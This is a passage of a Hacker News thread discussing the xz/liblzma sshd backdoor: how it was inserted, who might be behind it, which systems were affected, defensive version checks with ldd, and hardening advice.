class="by">geggo98</span><span>|</span><a href="#39880945">parent</a><span>|</span><a href="#39881795">next</a><span>|</span><label class="collapse" for="c-39882350">[-]</label><label class="expand" for="c-39882350">[1 more]</label></div><br/><div class="children"><div class="content">My suggestion: Put your SSH behind WireGuard and&#x2F;or behind a jump host (with only port forwarding allowed, no shell). If you don’t have a separate host, use a Docker container.<p>If you use a jump host, consider a different OS (e.g., BSD vs Linux). Remember this analogy with slices of Swiss cheese used during the pandemics? If one slice has a hole, the next slice hopefully won’t have a hole on the same position. The more slices you have, the better for you.<p>Although for remote management, you don’t want to have too many “slices” you have to manage and that can fail.</div><br/></div></div><div id="39881795" class="c"><input type="checkbox" id="c-39881795" checked=""/><div class="controls bullet"><span class="by">pilgrim0</span><span>|</span><a href="#39880945">parent</a><span>|</span><a href="#39882350">prev</a><span>|</span><a href="#39880950">next</a><span>|</span><label class="collapse" for="c-39881795">[-]</label><label class="expand" for="c-39881795">[1 more]</label></div><br/><div class="children"><div class="content">I would, by routine, advise that publicly available boxes are configured to accept connections only from whitelisted sources, doing that at the lowest possible level on the stack. That’s usually how secure environments such as those used in PCI compliant topologies are specified.</div><br/></div></div><div id="39880950" class="c"><input type="checkbox" id="c-39880950" checked=""/><div class="controls bullet"><span class="by">Valord</span><span>|</span><a href="#39880945">parent</a><span>|</span><a href="#39881795">prev</a><span>|</span><a href="#39878762">next</a><span>|</span><label class="collapse" for="c-39880950">[-]</label><label class="expand" for="c-39880950">[2 more]</label></div><br/><div class="children"><div class="content">Same!</div><br/><div id="39880970" class="c"><input type="checkbox" id="c-39880970" checked=""/><div class="controls bullet"><span class="by">somethingsaid</span><span>|</span><a href="#39880945">root</a><span>|</span><a href="#39880950">parent</a><span>|</span><a href="#39878762">next</a><span>|</span><label class="collapse" for="c-39880970">[-]</label><label class="expand" for="c-39880970">[1 more]</label></div><br/><div class="children"><div class="content">Right now, nothing. The issue didn’t reach mainstream builds except nightly Red Hat and Fedora 41. The xz version affected has already been pulled and won’t be included in any future software versions.</div><br/></div></div></div></div></div></div><div id="39878762" class="c"><input type="checkbox" id="c-39878762" checked=""/><div class="controls bullet"><span class="by">sneak</span><span>|</span><a href="#39880945">prev</a><span>|</span><a href="#39881523">next</a><span>|</span><label class="collapse" for="c-39878762">[-]</label><label class="expand" for="c-39878762">[7 more]</label></div><br/><div class="children"><div class="content">The questions this backdoor raises:<p>- what other ones exist by this same team or similar teams?<p>- how many such teams are operating?<p>- how many such dependencies are vulnerable to such infiltration attacks?  what is our industry’s attack surface for such covert operations?<p>I think making a graph of all major network services (apache httpd, postgres, mysql, nginx, openssh, dropbear ssh, haproxy, varnish, caddy, squid, postfix, etc) and all of their dependencies and all of the committers to all of those dependencies might be the first step in seeing which parts are the most high value and have attracted the least scrutiny.<p>This can’t be the first time someone attempted this - this is just the first unsuccessful time. (Yes, I know about the attempted&#x2F;discovered backdoor in the linux kernel - this is remote and is a horse of a different color).</div><br/><div id="39879098" class="c"><input type="checkbox" id="c-39879098" checked=""/><div class="controls bullet"><span class="by">almostnormal</span><span>|</span><a href="#39878762">parent</a><span>|</span><a href="#39881085">next</a><span>|</span><label class="collapse" for="c-39879098">[-]</label><label class="expand" for="c-39879098">[5 more]</label></div><br/><div class="children"><div class="content">Why did they decide to create a backdoor, instead of using a zeroday like everyone else?<p>Why did they implement a fully-featured backdoor and attempted to hide the way it is deployed, instead of deploying something innocent-looking that might as well be a bug if detected?<p>These must have been conscious decisions. The reasons might provide a hint what the goals might have been.</div><br/><div id="39879524" class="c"><input type="checkbox" id="c-39879524" checked=""/><div class="controls bullet"><span class="by">bdd8f1df777b</span><span>|</span><a href="#39878762">root</a><span>|</span><a href="#39879098">parent</a><span>|</span><a href="#39879311">next</a><span>|</span><label class="collapse" for="c-39879524">[-]</label><label class="expand" for="c-39879524">[1 more]</label></div><br/><div class="children"><div class="content">Presumably because other people can also utilize the “bug” they create intentionally but looking inadvertently. This backdoor however is activated by the private key only the attacker has so it’s airtight.</div><br/></div></div><div id="39879311" class="c"><input type="checkbox" id="c-39879311" checked=""/><div class="controls bullet"><span class="by">Ekaros</span><span>|</span><a href="#39878762">root</a><span>|</span><a href="#39879098">parent</a><span>|</span><a href="#39879524">prev</a><span>|</span><a href="#39879293">next</a><span>|</span><label class="collapse" for="c-39879311">[-]</label><label class="expand" for="c-39879311">[1 more]</label></div><br/><div class="children"><div class="content">If they seemingly almost succeeded how many others have already done similar backdoor? Or was this actually just poking on things seeing if it was possible to inject this sort of behaviour?</div><br/></div></div><div id="39879293" class="c"><input type="checkbox" id="c-39879293" checked=""/><div class="controls bullet"><span class="by">formerly_proven</span><span>|</span><a href="#39878762">root</a><span>|</span><a href="#39879098">parent</a><span>|</span><a href="#39879311">prev</a><span>|</span><a href="#39879570">next</a><span>|</span><label class="collapse" for="c-39879293">[-]</label><label class="expand" for="c-39879293">[1 more]</label></div><br/><div class="children"><div class="content">Ed448 is orders of magnitude better NOBUS than hoping that nobody else stumbles over the zero-day you found.</div><br/></div></div><div id="39879570" class="c"><input type="checkbox" id="c-39879570" checked=""/><div class="controls bullet"><span class="by">im3w1l</span><span>|</span><a href="#39878762">root</a><span>|</span><a href="#39879098">parent</a><span>|</span><a href="#39879293">prev</a><span>|</span><a href="#39881085">next</a><span>|</span><label class="collapse" for="c-39879570">[-]</label><label class="expand" for="c-39879570">[1 more]</label></div><br/><div class="children"><div class="content">Wild guess, but it could be that whoever was behind this was highly motivated but didn&#x27;t have the skill required to find zerodays and didn&#x27;t have the connections required to buy them (and distrusted the come one come all marketplaces I assume must exist).</div><br/></div></div></div></div><div id="39881085" class="c"><input type="checkbox" id="c-39881085" checked=""/><div class="controls bullet"><span class="by">mdavidn</span><span>|</span><a href="#39878762">parent</a><span>|</span><a href="#39879098">prev</a><span>|</span><a href="#39881523">next</a><span>|</span><label class="collapse" for="c-39881085">[-]</label><label class="expand" for="c-39881085">[1 more]</label></div><br/><div class="children"><div class="content">Also: Why did Debian patch a service that runs as root and accepts connections from the internet to load unnecessary libraries?</div><br/></div></div></div></div><div id="39881523" class="c"><input type="checkbox" id="c-39881523" checked=""/><div class="controls bullet"><span class="by">bandrami</span><span>|</span><a href="#39878762">prev</a><span>|</span><a href="#39879877">next</a><span>|</span><label class="collapse" for="c-39881523">[-]</label><label class="expand" for="c-39881523">[1 more]</label></div><br/><div class="children"><div class="content">This was so bizarre I had to check twice that it isn&#x27;t actually April 1 (I&#x27;m in Asia so I get a lot of off-by-one-day stories from the US)</div><br/></div></div><div id="39880435" class="c"><input type="checkbox" id="c-39880435" checked=""/><div class="controls bullet"><span class="by">DrTung</span><span>|</span><a href="#39879877">prev</a><span>|</span><a href="#39878124">next</a><span>|</span><label class="collapse" for="c-39880435">[-]</label><label class="expand" for="c-39880435">[6 more]</label></div><br/><div class="children"><div class="content">If the RCE is Russian, it could be used a communication kill-switch on the morning of an attack outside Ukraine, similar to the Viasat hack   <a href="https:&#x2F;&#x2F;en.m.wikipedia.org&#x2F;wiki&#x2F;Viasat_hack" rel="nofollow">https:&#x2F;&#x2F;en.m.wikipedia.org&#x2F;wiki&#x2F;Viasat_hack</a></div><br/><div id="39881041" class="c"><input type="checkbox" id="c-39881041" checked=""/><div class="controls bullet"><span class="by">KnightHawk3</span><span>|</span><a href="#39880435">parent</a><span>|</span><a href="#39878124">next</a><span>|</span><label class="collapse" for="c-39881041">[-]</label><label class="expand" for="c-39881041">[5 more]</label></div><br/><div class="children"><div class="content">Why does it have to be russian? Could be any country, even USA, China. I don&#x27;t see why this sort of attack is limited to Russia.</div><br/><div id="39882165" class="c"><input type="checkbox" id="c-39882165" checked=""/><div class="controls bullet"><span class="by">timeon</span><span>|</span><a href="#39880435">root</a><span>|</span><a href="#39881041">parent</a><span>|</span><a href="#39881595">next</a><span>|</span><label class="collapse" for="c-39882165">[-]</label><label class="expand" for="c-39882165">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Why does it have to be russian? Could be any country, even USA, China.<p>Are you sure you are replying to right comment? Because they did not implied it was not other country or actor. It even directly starts with &#x27;IF&#x27;.</div><br/></div></div><div id="39881595" class="c"><input type="checkbox" id="c-39881595" checked=""/><div class="controls bullet"><span class="by">spxneo</span><span>|</span><a href="#39880435">root</a><span>|</span><a href="#39881041">parent</a><span>|</span><a href="#39882165">prev</a><span>|</span><a href="#39878124">next</a><span>|</span><label class="collapse" for="c-39881595">[-]</label><label class="expand" for="c-39881595">[3 more]</label></div><br/><div class="children"><div class="content">Exactly I don&#x27;t understand the obsession with Russia<p>Literally just a country with people like you and me.<p>&quot;Jia Tan&quot; does not sound Russian<p><a href="https:&#x2F;&#x2F;boehs.org&#x2F;node&#x2F;everything-i-know-about-the-xz-backdoor" rel="nofollow">https:&#x2F;&#x2F;boehs.org&#x2F;node&#x2F;everything-i-know-about-the-xz-backdo...</a></div><br/><div id="39881697" class="c"><input type="checkbox" id="c-39881697" checked=""/><div class="controls bullet"><span class="by">jsploit</span><span>|</span><a href="#39880435">root</a><span>|</span><a href="#39881595">parent</a><span>|</span><a href="#39878124">next</a><span>|</span><label class="collapse" for="c-39881697">[-]</label><label class="expand" for="c-39881697">[2 more]</label></div><br/><div class="children"><div class="content">&gt; &quot;Jia Tan&quot; does not sound Russian<p>It&#x27;s not a real name.</div><br/><div id="39882187" class="c"><input type="checkbox" id="c-39882187" checked=""/><div class="controls bullet"><span class="by">trallnag</span><span>|</span><a href="#39880435">root</a><span>|</span><a href="#39881697">parent</a><span>|</span><a href="#39878124">next</a><span>|</span><label class="collapse" for="c-39882187">[-]</label><label class="expand" for="c-39882187">[1 more]</label></div><br/><div class="children"><div class="content">What about X Æ A-12?</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39878124" class="c"><input type="checkbox" id="c-39878124" checked=""/><div class="controls bullet"><span class="by">bawolff</span><span>|</span><a href="#39880435">prev</a><span>|</span><a href="#39879872">next</a><span>|</span><label class="collapse" for="c-39878124">[-]</label><label class="expand" for="c-39878124">[6 more]</label></div><br/><div class="children"><div class="content">The headline seems like a distinction without a difference. Bypassing ssh auth means getting a root shell. There is no significant difference between that and running system(). At most maybe system() has less logging.</div><br/><div id="39878167" class="c"><input type="checkbox" id="c-39878167" checked=""/><div class="controls bullet"><span class="by">armitron</span><span>|</span><a href="#39878124">parent</a><span>|</span><a href="#39878338">next</a><span>|</span><label class="collapse" for="c-39878167">[-]</label><label class="expand" for="c-39878167">[4 more]</label></div><br/><div class="children"><div class="content">&gt; Bypassing ssh auth means getting a root shell<p>Only if you&#x27;re allowed to login as root, which is definitely not the case everywhere.</div><br/><div id="39879165" class="c"><input type="checkbox" id="c-39879165" checked=""/><div class="controls bullet"><span class="by">juliusdavies</span><span>|</span><a href="#39878124">root</a><span>|</span><a href="#39878167">parent</a><span>|</span><a href="#39879147">next</a><span>|</span><label class="collapse" for="c-39879165">[-]</label><label class="expand" for="c-39879165">[1 more]</label></div><br/><div class="children"><div class="content">My sense was this backdoor gets to execute whatever it wants using whatever &quot;user&quot; sshd is running as.  So even if root logins are disabled, this backdoor doesn&#x27;t care.</div><br/></div></div><div id="39879147" class="c"><input type="checkbox" id="c-39879147" checked=""/><div class="controls bullet"><span class="by">colinsane</span><span>|</span><a href="#39878124">root</a><span>|</span><a href="#39878167">parent</a><span>|</span><a href="#39879165">prev</a><span>|</span><a href="#39880873">next</a><span>|</span><label class="collapse" for="c-39879147">[-]</label><label class="expand" for="c-39879147">[1 more]</label></div><br/><div class="children"><div class="content">not only that, but logins show up in logs.</div><br/></div></div><div id="39880873" class="c"><input type="checkbox" id="c-39880873" checked=""/><div class="controls bullet"><span class="by">wepple</span><span>|</span><a href="#39878124">root</a><span>|</span><a href="#39878167">parent</a><span>|</span><a href="#39879147">prev</a><span>|</span><a href="#39878338">next</a><span>|</span><label class="collapse" for="c-39880873">[-]</label><label class="expand" for="c-39880873">[1 more]</label></div><br/><div class="children"><div class="content">Plus, detection is likely to be be very different.</div><br/></div></div></div></div></div></div><div id="39879872" class="c"><input type="checkbox" id="c-39879872" checked=""/><div class="controls bullet"><span class="by">rany_</span><span>|</span><a href="#39878124">prev</a><span>|</span><a href="#39877673">next</a><span>|</span><label class="collapse" for="c-39879872">[-]</label><label class="expand" for="c-39879872">[6 more]</label></div><br/><div class="children"><div class="content">If my server doesn&#x27;t have any RSA public keys in its authorized_keys, only ed25519 keys; does this backdoor just not work?</div><br/><div id="39882036" class="c"><input type="checkbox" id="c-39882036" checked=""/><div class="controls bullet"><span class="by">adtac</span><span>|</span><a href="#39879872">parent</a><span>|</span><a href="#39882016">next</a><span>|</span><label class="collapse" for="c-39882036">[-]</label><label class="expand" for="c-39882036">[3 more]</label></div><br/><div class="children"><div class="content">It will still work if the connecting client offers a RSA key.<p>The only real way to be sure it&#x27;s not on your system is if your liblzma version is strictly less than 5.6.0 (first infected version):<p><pre><code>    ls -al $(ldd $(which sshd) | grep lzma | awk &#x27;{ print $3 }&#x27;)</code></pre></div><br/><div id="39882416" class="c"><input type="checkbox" id="c-39882416" checked=""/><div class="controls bullet"><span class="by">rany_</span><span>|</span><a href="#39879872">root</a><span>|</span><a href="#39882036">parent</a><span>|</span><a href="#39882016">next</a><span>|</span><label class="collapse" for="c-39882416">[-]</label><label class="expand" for="c-39882416">[2 more]</label></div><br/><div class="children"><div class="content">Thanks for the reply, I was just curious because `RSA_public_decrypt` threw me off.</div><br/><div id="39882448" class="c"><input type="checkbox" id="c-39882448" checked=""/><div class="controls bullet"><span class="by">adtac</span><span>|</span><a href="#39879872">root</a><span>|</span><a href="#39882416">parent</a><span>|</span><a href="#39882016">next</a><span>|</span><label class="collapse" for="c-39882448">[-]</label><label class="expand" for="c-39882448">[1 more]</label></div><br/><div class="children"><div class="content">FWIW RSA_public_decrypt is an 90s way of saying RSA_signature_validate</div><br/></div></div></div></div></div></div><div id="39882016" class="c"><input type="checkbox" id="c-39882016" checked=""/><div class="controls bullet"><span class="by">keiba</span><span>|</span><a href="#39879872">parent</a><span>|</span><a href="#39882036">prev</a><span>|</span><a href="#39877673">next</a><span>|</span><label class="collapse" for="c-39882016">[-]</label><label class="expand" for="c-39882016">[2 more]</label></div><br/><div class="children"><div class="content">This backdoor does not care about any of the authorisation configuration set by the user.<p>It is executed before that step. So just make sure you are not affected.</div><br/><div id="39882427" class="c"><input type="checkbox" id="c-39882427" checked=""/><div class="controls bullet"><span class="by">rany_</span><span>|</span><a href="#39879872">root</a><span>|</span><a href="#39882016">parent</a><span>|</span><a href="#39877673">next</a><span>|</span><label class="collapse" for="c-39882427">[-]</label><label class="expand" for="c-39882427">[1 more]</label></div><br/><div class="children"><div class="content">It was just that it hooks to `RSA_public_decrypt` which threw me off, I didn&#x27;t really understand this backdoor much. I only have one Debian sid machine which was vulnerable and accessible via a public IPv4 ssh, I&#x27;m not sure if I should just wipe it.</div><br/></div></div></div></div></div></div><div id="39877673" class="c"><input type="checkbox" id="c-39877673" checked=""/><div class="controls bullet"><span class="by">Animats</span><span>|</span><a href="#39879872">prev</a><span>|</span><a href="#39880273">next</a><span>|</span><label class="collapse" for="c-39877673">[-]</label><label class="expand" for="c-39877673">[20 more]</label></div><br/><div class="children"><div class="content">Is there a git diff which shows this going in?</div><br/><div id="39879406" class="c"><input type="checkbox" id="c-39879406" checked=""/><div class="controls bullet"><span class="by">ptx</span><span>|</span><a href="#39877673">parent</a><span>|</span><a href="#39877833">next</a><span>|</span><label class="collapse" for="c-39879406">[-]</label><label class="expand" for="c-39879406">[1 more]</label></div><br/><div class="children"><div class="content">I think they added it in parts over the course of a year or two, with each part being plausibly innocent-looking: First some testing infrastructure, some test cases with binary test data to test compression, updates to the build scripts – and then some updates to those existing binary files to put the obfuscated payload in place, modifications to the build scripts to activate it, etc.</div><br/></div></div><div id="39877833" class="c"><input type="checkbox" id="c-39877833" checked=""/><div class="controls bullet"><span class="by">tempodox</span><span>|</span><a href="#39877673">parent</a><span>|</span><a href="#39879406">prev</a><span>|</span><a href="#39880273">next</a><span>|</span><label class="collapse" for="c-39877833">[-]</label><label class="expand" for="c-39877833">[18 more]</label></div><br/><div class="children"><div class="content">Apparently it’s not in the original repo, but in a build script in a distribution tar.</div><br/><div id="39877921" class="c"><input type="checkbox" id="c-39877921" checked=""/><div class="controls bullet"><span class="by">joshcryer</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39877833">parent</a><span>|</span><a href="#39877935">next</a><span>|</span><label class="collapse" for="c-39877921">[-]</label><label class="expand" for="c-39877921">[16 more]</label></div><br/><div class="children"><div class="content">They also used social engineering to disable fuzzing which would have caught the discrepancy: <a href="https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz&#x2F;pull&#x2F;10667">https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz&#x2F;pull&#x2F;10667</a></div><br/><div id="39878032" class="c"><input type="checkbox" id="c-39878032" checked=""/><div class="controls bullet"><span class="by">codetrotter</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39877921">parent</a><span>|</span><a href="#39878964">next</a><span>|</span><label class="collapse" for="c-39878032">[-]</label><label class="expand" for="c-39878032">[6 more]</label></div><br/><div class="children"><div class="content">It’s pretty funny how a bunch of people come piling reaction emojis onto the comments in the PR, <i>after</i> it has all become publicly known.<p>I’m like.. bro, adding reaction emojis after the fact as if that makes any sort of difference to anything.</div><br/><div id="39879019" class="c"><input type="checkbox" id="c-39879019" checked=""/><div class="controls bullet"><span class="by">jijijijij</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878032">parent</a><span>|</span><a href="#39878105">next</a><span>|</span><label class="collapse" for="c-39879019">[-]</label><label class="expand" for="c-39879019">[1 more]</label></div><br/><div class="children"><div class="content">That thread has become an online event and obviously lost its original constructive purpose the moment the malicious intent became public. The commenters are not trying to alter history, it&#x27;s leaving their mark in an historic moment. I mean the &quot;lgtm&quot; aged like milk and the emoji reactions are pretty funny commentary.</div><br/></div></div><div id="39878105" class="c"><input type="checkbox" id="c-39878105" checked=""/><div class="controls bullet"><span class="by">happosai</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878032">parent</a><span>|</span><a href="#39879019">prev</a><span>|</span><a href="#39878748">next</a><span>|</span><label class="collapse" for="c-39878105">[-]</label><label class="expand" for="c-39878105">[1 more]</label></div><br/><div class="children"><div class="content">Honestly, it&#x27;s harrasment at this point.</div><br/></div></div><div id="39878748" class="c"><input type="checkbox" id="c-39878748" checked=""/><div class="controls bullet"><span class="by">qudat</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878032">parent</a><span>|</span><a href="#39878105">prev</a><span>|</span><a href="#39878964">next</a><span>|</span><label class="collapse" for="c-39878748">[-]</label><label class="expand" for="c-39878748">[3 more]</label></div><br/><div class="children"><div class="content">Feels almost like tampering with evidence at a crime scene</div><br/><div id="39880312" class="c"><input type="checkbox" id="c-39880312" checked=""/><div class="controls bullet"><span class="by">lazide</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878748">parent</a><span>|</span><a href="#39879937">next</a><span>|</span><label class="collapse" for="c-39880312">[-]</label><label class="expand" for="c-39880312">[1 more]</label></div><br/><div class="children"><div class="content">It’s just adding your initials on the tunnel someone famous just died in.</div><br/></div></div><div id="39879937" class="c"><input type="checkbox" id="c-39879937" checked=""/><div class="controls bullet"><span class="by">cqqxo4zV46cp</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878748">parent</a><span>|</span><a href="#39880312">prev</a><span>|</span><a href="#39878964">next</a><span>|</span><label class="collapse" for="c-39879937">[-]</label><label class="expand" for="c-39879937">[1 more]</label></div><br/><div class="children"><div class="content">That’s absurd. Elaborate.</div><br/></div></div></div></div></div></div><div id="39878964" class="c"><input type="checkbox" id="c-39878964" checked=""/><div class="controls bullet"><span class="by">filleokus</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39877921">parent</a><span>|</span><a href="#39878032">prev</a><span>|</span><a href="#39878876">next</a><span>|</span><label class="collapse" for="c-39878964">[-]</label><label class="expand" for="c-39878964">[5 more]</label></div><br/><div class="children"><div class="content">Would it really have caught it?</div><br/><div id="39879314" class="c"><input type="checkbox" id="c-39879314" checked=""/><div class="controls bullet"><span class="by">formerly_proven</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878964">parent</a><span>|</span><a href="#39878876">next</a><span>|</span><label class="collapse" for="c-39879314">[-]</label><label class="expand" for="c-39879314">[4 more]</label></div><br/><div class="children"><div class="content">No</div><br/><div id="39879720" class="c"><input type="checkbox" id="c-39879720" checked=""/><div class="controls bullet"><span class="by">pas</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39879314">parent</a><span>|</span><a href="#39878876">next</a><span>|</span><label class="collapse" for="c-39879720">[-]</label><label class="expand" for="c-39879720">[3 more]</label></div><br/><div class="children"><div class="content">... why?</div><br/><div id="39880134" class="c"><input type="checkbox" id="c-39880134" checked=""/><div class="controls bullet"><span class="by">ycombinatrix</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39879720">parent</a><span>|</span><a href="#39880044">next</a><span>|</span><label class="collapse" for="c-39880134">[-]</label><label class="expand" for="c-39880134">[1 more]</label></div><br/><div class="children"><div class="content">my understanding is that fuzzing &quot;caught&quot; the issue by crashing with ifunc disabled<p>but it wouldn&#x27;t have &quot;caught&quot; the backdoor which uses public key cryptography</div><br/></div></div><div id="39880044" class="c"><input type="checkbox" id="c-39880044" checked=""/><div class="controls bullet"><span class="by">filleokus</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39879720">parent</a><span>|</span><a href="#39880134">prev</a><span>|</span><a href="#39878876">next</a><span>|</span><label class="collapse" for="c-39880044">[-]</label><label class="expand" for="c-39880044">[1 more]</label></div><br/><div class="children"><div class="content">Did the artefact produced [0] for fussing even include the backdoored .so? My understanding was that the compromised build-scripts had measures to only run when producing deb&#x2F;rpms.<p><a href="https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz&#x2F;blob&#x2F;5f70676a6c9050b9cb687cdb1543354702a8c757&#x2F;projects&#x2F;xz&#x2F;build.sh">https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz&#x2F;blob&#x2F;5f70676a6c9050b9cb68...</a></div><br/></div></div></div></div></div></div></div></div><div id="39878876" class="c"><input type="checkbox" id="c-39878876" checked=""/><div class="controls bullet"><span class="by">moomoo11</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39877921">parent</a><span>|</span><a href="#39878964">prev</a><span>|</span><a href="#39877935">next</a><span>|</span><label class="collapse" for="c-39878876">[-]</label><label class="expand" for="c-39878876">[4 more]</label></div><br/><div class="children"><div class="content">Is the person Jia who did this PR a malicious actor?</div><br/><div id="39879146" class="c"><input type="checkbox" id="c-39879146" checked=""/><div class="controls bullet"><span class="by">CSMastermind</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39878876">parent</a><span>|</span><a href="#39877935">next</a><span>|</span><label class="collapse" for="c-39879146">[-]</label><label class="expand" for="c-39879146">[3 more]</label></div><br/><div class="children"><div class="content">The person who submitted the PR, JiaT75, is.<p>The person who approved and merged it is not.</div><br/><div id="39881329" class="c"><input type="checkbox" id="c-39881329" checked=""/><div class="controls bullet"><span class="by">Animats</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39879146">parent</a><span>|</span><a href="#39879327">next</a><span>|</span><label class="collapse" for="c-39881329">[-]</label><label class="expand" for="c-39881329">[1 more]</label></div><br/><div class="children"><div class="content">Has that person been found yet?<p>Does this problem require cops, or an airstrike?</div><br/></div></div><div id="39879327" class="c"><input type="checkbox" id="c-39879327" checked=""/><div class="controls bullet"><span class="by">moomoo11</span><span>|</span><a href="#39877673">root</a><span>|</span><a href="#39879146">parent</a><span>|</span><a href="#39881329">prev</a><span>|</span><a href="#39877935">next</a><span>|</span><label class="collapse" for="c-39879327">[-]</label><label class="expand" for="c-39879327">[1 more]</label></div><br/><div class="children"><div class="content">Yeah that’s what I am asking. Thanks</div><br/></div></div></div></div></div></div></div></div></div></div></div></div><div id="39880273" class="c"><input type="checkbox" id="c-39880273" checked=""/><div class="controls bullet"><span class="by">xuhu</span><span>|</span><a href="#39877673">prev</a><span>|</span><a href="#39881184">next</a><span>|</span><label class="collapse" for="c-39880273">[-]</label><label class="expand" for="c-39880273">[1 more]</label></div><br/><div class="children"><div class="content">It just seems implausible that the malicious x86 code would not have shown up in strace, perf record, or some backtrace. Once this ended up in all the major distros, some syscall or glibc call would have eventually looked like a red flag to someone before long.</div><br/></div></div><div id="39881184" class="c"><input type="checkbox" id="c-39881184" checked=""/><div class="controls bullet"><span class="by">ivlad</span><span>|</span><a href="#39880273">prev</a><span>|</span><a href="#39878714">next</a><span>|</span><label class="collapse" for="c-39881184">[-]</label><label class="expand" for="c-39881184">[1 more]</label></div><br/><div class="children"><div class="content">Doesn’t certificate verification occur in PrevSep process? If so, this would only grant RCE with nobody’s privilege.</div><br/></div></div><div id="39878714" class="c"><input type="checkbox" id="c-39878714" checked=""/><div class="controls bullet"><span class="by">paolomainardi</span><span>|</span><a href="#39881184">prev</a><span>|</span><a href="#39879847">next</a><span>|</span><label class="collapse" for="c-39878714">[-]</label><label class="expand" for="c-39878714">[5 more]</label></div><br/><div class="children"><div class="content">I am wondering if reinstalling the entire Archlinux installation would be a wise choice.</div><br/><div id="39878767" class="c"><input type="checkbox" id="c-39878767" checked=""/><div class="controls bullet"><span class="by">sebiw</span><span>|</span><a href="#39878714">parent</a><span>|</span><a href="#39879294">next</a><span>|</span><label class="collapse" for="c-39878767">[-]</label><label class="expand" for="c-39878767">[3 more]</label></div><br/><div class="children"><div class="content">Arch Linux uses a native&#x2F;unpatched version of OpenSSH without dependency on libsystemd and thus without dependency on xz-utils, resulting in no exploitable code path. This means that at least the currently talked about vulnerability&#x2F;exploit via SSH did presumably not work on Arch. Disclaimer: This is my understanding of the currently circulating facts. Additional fallout might be possible, as the reverse engineering of the backdoor is ongoing.</div><br/><div id="39881998" class="c"><input type="checkbox" id="c-39881998" checked=""/><div class="controls bullet"><span class="by">Deathcrow</span><span>|</span><a href="#39878714">root</a><span>|</span><a href="#39878767">parent</a><span>|</span><a href="#39879564">next</a><span>|</span><label class="collapse" for="c-39881998">[-]</label><label class="expand" for="c-39881998">[1 more]</label></div><br/><div class="children"><div class="content">This is only correct if the sshd backdoor is the only malicious code introduced into the library.</div><br/></div></div><div id="39879564" class="c"><input type="checkbox" id="c-39879564" checked=""/><div class="controls bullet"><span class="by">pas</span><span>|</span><a href="#39878714">root</a><span>|</span><a href="#39878767">parent</a><span>|</span><a href="#39881998">prev</a><span>|</span><a href="#39879294">next</a><span>|</span><label class="collapse" for="c-39879564">[-]</label><label class="expand" for="c-39879564">[1 more]</label></div><br/><div class="children"><div class="content">there are other ways for liblzma to get into ssh (via PAM and libselinux)</div><br/></div></div></div></div><div id="39879294" class="c"><input type="checkbox" id="c-39879294" checked=""/><div class="controls bullet"><span class="by">Phelinofist</span><span>|</span><a href="#39878714">parent</a><span>|</span><a href="#39878767">prev</a><span>|</span><a href="#39879847">next</a><span>|</span><label class="collapse" for="c-39879294">[-]</label><label class="expand" for="c-39879294">[1 more]</label></div><br/><div class="children"><div class="content">Just to extend the sibling comment with an excerpt of the Arch announce mail regarding the backdoor:<p><pre><code>  &gt;From the upstream report [1]:
  
  &amp;gt; openssh does not directly use liblzma. However debian and several other
  distributions patch openssh to support systemd notification, and libsystemd
  does depend on lzma.
  
  Arch does not directly link openssh to liblzma, and thus this attack vector is not possible. You can confirm this by issuing the following command:
   
   ```
   ldd &amp;quot;$(command -v sshd)&amp;quot;
   ```
   
  However, out of an abundance of caution, we advise users to remove the malicious code from their system by upgrading either way. This is because other yet-to-be discovered methods to exploit the backdoor could exist.</code></pre></div><br/></div></div></div></div><div id="39879847" class="c"><input type="checkbox" id="c-39879847" checked=""/><div class="controls bullet"><span class="by">dboreham</span><span>|</span><a href="#39878714">prev</a><span>|</span><a href="#39882073">next</a><span>|</span><label class="collapse" for="c-39879847">[-]</label><label class="expand" for="c-39879847">[1 more]</label></div><br/><div class="children"><div class="content">So this is called the house of cards backdoor now?</div><br/></div></div><div id="39882073" class="c"><input type="checkbox" id="c-39882073" checked=""/><div class="controls bullet"><span class="by">nprateem</span><span>|</span><a href="#39879847">prev</a><span>|</span><a href="#39880339">next</a><span>|</span><label class="collapse" for="c-39882073">[-]</label><label class="expand" for="c-39882073">[1 more]</label></div><br/><div class="children"><div class="content">We basically need to analyse dependencies used in critical code paths (e.g. network attached services like sshd) and then start a process to add more rigorous controls around them. Some kind of enhanced scrutiny, certification and governance instead of relying on repos with individual maintainers and no meaningful code reviews, branch protection, etc.<p>And by <i>we</i> I mean at international&#x2F;governmental level. Free software needs to stop being $free.<p>Society needs to start paying for the critical foundations upon which we all stand.</div><br/></div></div><div id="39880339" class="c"><input type="checkbox" id="c-39880339" checked=""/><div class="controls bullet"><span class="by">lyu07282</span><span>|</span><a href="#39882073">prev</a><span>|</span><label class="collapse" for="c-39880339">[-]</label><label class="expand" for="c-39880339">[4 more]</label></div><br/><div class="children"><div class="content">God the amount of damage this would&#x27;ve caused, nightmarish, we are so unbelievably lucky. In a few months it would&#x27;ve been in every deb&amp;rpm distribution. Thank God we found it early!</div><br/><div id="39880638" class="c"><input type="checkbox" id="c-39880638" checked=""/><div class="controls bullet"><span class="by">supposemaybe</span><span>|</span><a href="#39880339">parent</a><span>|</span><label class="collapse" for="c-39880638">[-]</label><label class="expand" for="c-39880638">[3 more]</label></div><br/><div class="children"><div class="content">Found it early?..<p>I found the backdoor on five of my Vultr servers as well as my MacBook Pro this evening. I certainly didn’t catch it early.<p>So if that’s the state of it, it could very well be too late for many many companies. Not to mention  folks who rely on TOR for 